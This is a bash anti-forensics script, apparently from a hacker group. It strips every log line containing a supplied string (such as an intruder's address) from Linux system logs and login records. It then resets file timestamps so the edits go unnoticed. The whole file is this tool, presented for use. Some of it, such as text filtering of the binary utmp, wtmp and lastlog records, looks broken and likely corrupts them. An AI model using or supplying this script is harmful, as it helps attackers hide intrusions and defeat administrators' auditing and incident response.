#!/bin/bash

echo "                Linux Hider v2.0 by mave"
echo "                enhanced by me!         "
echo "[+] [Shkupi Logcleaner] Removing $1 from the logs........ ."
echo ""

if [ -f /var/log/maillog ]; then
   cat /var/log/maillog | grep -v $1 > /tmp/maillog.xz
   touch -acmr /var/log/maillog /tmp/maillog.xz
   mv -f /tmp/maillog.xz /var/log/maillog
   echo "[+] /var/log/maillog   ... [done]"
   echo ""
fi

if [ -f /var/log/messages ]; then
   cat /var/log/messages | grep -v $1 > /tmp/messages.xz
   touch -acmr /var/log/messages /tmp/messages.xz
   mv -f /tmp/messages.xz /var/log/messages
   echo "[+] /var/log/messages  ... [done]"
   sleep 2
   echo ""
fi

if [ -f /var/log/secure ]; then
   cat /var/log/secure | grep -v $1 > /tmp/secure.xz
   touch -acmr /var/log/secure /tmp/secure.xz
   mv -f /tmp/secure.xz /var/log/secure
   echo "[+] /var/log/secure    ... [done]"
   echo ""
fi

if [ -f /var/log/xferlog ]; then
   cat /var/log/xferlog | grep -v $1 > /tmp/xferlog.xz
   touch -acmr /var/log/xferlog /tmp/xferlog.xz
   mv -f /tmp/xferlog.xz /var/log/xferlog
   sleep 2
   echo "[+] /var/log/xferlog   ... [done]"
   echo ""
fi

if [ -f /var/run/utmp ]; then
   cat /var/run/utmp | grep -v $1 > /tmp/utmp.xz
   touch -acmr /var/run/utmp /tmp/utmp.xz
   mv -f /tmp/utmp.xz /var/run/utmp
   echo "[+] /var/run/utmp      ... [done]"
   echo ""
fi

if [ -f /var/log/lastlog ]; then
   cat /var/log/lastlog |grep -v $1 > /tmp/lastlog.xz
   touch -acmr /var/log/lastlog /tmp/lastlog.xz
   mv -f /tmp/lastlog.xz /var/log/lastlog
   sleep 2
   echo "[+] /var/log/lastlog   ... [done]"
   echo ""
fi

if [ -f /var/log/wtmp ]; then
   cat /var/log/wtmp |grep -v $1 > /tmp/wtmp.xz
   touch -acmr /var/log/wtmp /tmp/wtmp.xz
   mv -f /tmp/wtmp.xz /var/log/wtmp
   echo "[+] /var/log/wtmp      ... [done]"
   echo ""
fi

rm -f /tmp/*.xz
echo "            * m i s s i o n  a c c o m p l i s h e d *"
echo ""
sleep 2
echo "                    p.h.e.e.r  S.H.c.r.e.w"
echo ""
sleep 5
exit 1
